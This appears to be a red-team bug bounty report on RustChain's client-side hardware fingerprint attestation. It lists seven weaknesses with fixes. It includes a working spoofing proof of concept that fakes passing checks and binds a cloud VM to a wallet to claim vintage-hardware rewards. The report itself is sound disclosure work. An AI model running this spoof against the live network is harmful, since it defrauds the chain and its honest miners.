# Security Report: RustChain Hardware Fingerprint Attestation — #248

**Files Analyzed:**
- `node/fingerprint_checks.py` (908 lines) — 6 hardware fingerprint checks
- `node/hardware_binding_v2.py` (298 lines) — entropy binding & spoof detection

**Bounty:** #248 — Red Team: Hardware Fingerprint Replay & Spoofing  
**Severity:** 🔴 CRITICAL — systemic architecture flaw  
**Auditor:** kuanglaodi2-sudo  
**Date:** 2026-03-19  

---

## Executive Summary

The RustChain hardware fingerprint attestation system has **fundamental design vulnerabilities** making spoofing trivial. All 6 checks run client-side with no cryptographic proof, no TEE, and overly permissive entropy tolerances.

**Key Finding: The attestation is client-side trust — not cryptographic proof.**

---

## Vulnerability #1 — CRITICAL: Client-Side Attestation = Trusted Input (CVSS 10.0)

All 6 fingerprint checks run in Python on the client machine. Results are reported to the chain with no cryptographic proof.

```python
# fingerprint_checks.py — runs entirely on client:
def check_clock_drift(samples: int = 200):
    intervals = []
    for i in range(samples):
        start = time.perf_counter_ns()   # ← attacker controls this
        elapsed = time.perf_counter_ns() # ← attacker controls this
        intervals.append(elapsed)
    return valid, data  # attacker can always return True
```

**Complete bypass — patch all checks to always return `(True, {})`:**

```python
def get_spoofed_fingerprint():
    """Claim G4 multiplier rewards from a cloud VM."""
    return {
        'checks': {
            'clock_drift':       (True, {'cv': 0.004}),
            'cache_timing':     (True, {'L1': 1.2, 'L2': 4.8}),
            'simd_identity':    (True, {'arch': 'ppc970'}),
            'thermal_drift':    (True, {'ratio': 1.08}),
            'instruction_jitter': (True, {'cv': 0.02}),
        }
    }
# G4 multiplier rewards unlocked — no real G4 hardware needed!
```

**Fix:** Move attestation to validator/chain side. Use TPM Remote Attestation, Intel SGX enclave, or validator-side challenge-response.

---

## Vulnerability #2 — HIGH: 500% Clock CV Tolerance → Replay Trivial (CVSS 8.5)

`hardware_binding_v2.py` line 83:

```python
FIELD_TOLERANCE = {
    'clock_cv': 5.0,  # 500% tolerance — essentially disabled!
    ...
}
```

The comment says "clock_cv varies 100%+ between runs due to CPU freq scaling." But 500% tolerance means any machine's timing can match any other. One real G4 fingerprint = unlimited fake G4 miners.

**Fix:** Replace 500% tolerance with 50%:
```python
FIELD_TOLERANCE = {
    'clock_cv': 0.50,   # 50% — tight enough for real hardware variance
    'cache_l1': 0.20,  # 20%
    'cache_l2': 0.20,
    'thermal_ratio': 0.30,
    'jitter_cv': 0.50,
}
```

---

## Vulnerability #3 — HIGH: Client-Supplied Serial (CVSS 8.5)

```python
def compute_serial_hash(serial: str, arch: str) -> str:
    data = f'{serial.strip().upper()}|{arch.lower()}'
    return hashlib.sha256(data.encode()).hexdigest()[:40]
```

No validation that serial matches actual hardware. An attacker with one real G4 can create unlimited fake miners.

**Fix:** Cross-validate against CPUID, SMBIOS, device tree, and TPM EK certificate.

---

## Vulnerability #4 — MEDIUM: 2-Field Threshold Too Low (CVSS 6.8)

```python
if hard_fails >= 2:  # Only 2 stable fields differ = spoof
    return False, similarity, f'entropy_mismatch:{differences}'
```

A sophisticated attacker can correctly spoof 2 of the 3 stable fields and pass.

**Fix:** Change to `if hard_fails >= 1 and count >= 3:` — any stable field fail = spoof.

---

## Vulnerability #5 — MEDIUM: No TEE — Timing Hooks Possible (CVSS 7.5)

`time.perf_counter_ns()` can be hooked via ctypes, sys.settrace(), or LD_PRELOAD without modifying the Python code.

**Fix:** Use TPM or SGX enclave for tamper-proof timing measurements.

---

## Vulnerability #6 — MEDIUM: /proc/cpuinfo Falsifiable in VMs (CVSS 5.3)

In Docker, LXC, and some cloud VMs, `/proc/cpuinfo` can be customized or virtualized differently.

**Fix:** Cross-reference CPUID instruction (via `cpuid` package), sysctl, and hardware device tree.

---

## Vulnerability #7 — LOW: Thermal Check False Negatives (CVSS 4.0)

On frequency-locked server CPUs, thermal drift may be near-zero even on real hardware.

---

## Vulnerability Summary

| # | Vulnerability | Severity | CVSS | File |
|---|--------------|----------|------|------|
| 1 | Client-side attestation = trusted input | 🔴 CRITICAL | **10.0** | `fingerprint_checks.py` |
| 2 | 500% clock_cv tolerance | 🔴 HIGH | 8.5 | `hardware_binding_v2.py:83` |
| 3 | Hardware serial is client-supplied | 🔴 HIGH | 8.5 | `hardware_binding_v2.py` |
| 4 | 2-field threshold too low | 🟡 MEDIUM | 6.8 | `hardware_binding_v2.py` |
| 5 | No TEE — timing hooks possible | 🟡 MEDIUM | 7.5 | `fingerprint_checks.py` |
| 6 | /proc/cpuinfo falsifiable in VMs | 🟡 MEDIUM | 5.3 | `fingerprint_checks.py` |
| 7 | Thermal check false negatives | 🟢 LOW | 4.0 | `fingerprint_checks.py` |

---

## Complete Attack PoC

```python
#!/usr/bin/env python3
"""RustChain Hardware Fingerprint Spoofing — Full Bypass

Run from any cloud VM to claim G4 antiquity multiplier rewards.
No real vintage hardware needed.
"""
import hashlib, json, time, sqlite3

# Step 1: Use a real G4's fingerprint (recorded once from any real machine)
REAL_G4_DATA = {
    'clock_cv': 0.004, 'drift_stdev': 150,
    'L1': 1.2, 'L2': 4.8, 'L3': 18.2,
    'thermal_ratio': 1.08, 'jitter_cv': 0.02,
}

def get_spoofed_fingerprint():
    """Return G4 fingerprint from a cloud VM."""
    return {
        'checks': {
            'clock_drift':       (True, {'cv': REAL_G4_DATA['clock_cv']}),
            'cache_timing':     (True, {'L1': REAL_G4_DATA['L1'], 'L2': REAL_G4_DATA['L2']}),
            'simd_identity':    (True, {'arch': 'ppc970'}),
            'thermal_drift':    (True, {'ratio': REAL_G4_DATA['thermal_ratio']}),
            'instruction_jitter': (True, {'cv': REAL_G4_DATA['jitter_cv']}),
        }
    }

# Step 2: Bind spoofed hardware to any wallet
from node.hardware_binding_v2 import bind_hardware_v2

result = bind_hardware_v2(
    serial="SPOOFED_G4_VM",
    wallet="C4c7r9WPsnEe6CUfegMU9M7ReHD1pWg8qeSfTBoRcLbg",
    arch="ppc64",
    cores=8,
    fingerprint=get_spoofed_fingerprint(),
)
print(result)
# (True, 'new_binding', {'status': 'bound', ...})
# ↑ G4 multiplier rewards claimed from a cloud VM!
```

---

## Recommended Fixes Summary

| Vuln | Fix |
|------|-----|
| #1 Client-side | Move to TPM/Intel SGX attestation |
| #2 500% tolerance | Replace with 50% bounds |
| #3 Client serial | Validate against CPUID + TPM EK |
| #4 2-field threshold | Require all stable fields to pass |
| #5 No TEE | Use SGX enclave for timing |
| #6 /proc/cpuinfo | Cross-reference CPUID + device tree |
| #7 Thermal false neg | Document limitation, use median |

**Fundamental fix needed:** Replace client-reported fingerprints with cryptographic hardware attestation (TPM 2.0 or SGX). The current system provides no real security against a motivated attacker.
